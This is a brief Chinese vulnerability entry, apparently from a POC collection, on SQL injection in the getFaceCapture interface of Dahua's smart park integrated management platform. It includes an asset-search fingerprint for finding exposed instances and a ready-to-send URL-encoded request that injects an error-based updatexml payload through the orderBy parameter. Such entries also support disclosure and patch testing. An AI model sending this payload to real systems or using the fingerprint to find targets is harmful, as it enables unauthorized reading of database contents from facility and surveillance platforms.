# 大华 智慧园区综合管理平台 getFaceCapture SQL注入漏洞

## 漏洞描述

大华 智慧园区综合管理平台 getFaceCapture 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意SQL语句，获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>智慧园区综合管理平台 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="dahua-智慧园区综合管理平台"</a-checkbox></br>

## 漏洞复现

![img](../../../.vuepress/public/img/1645602936890-c40b0210-c98e-465a-b54d-4d5ce28cbdf1-20230812163925217.png)



请求POC

```php
/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D
```

![img](../../../.vuepress/public/img/1691823619224-89ff3b9c-ee7b-4051-abdf-bdb259873043.png)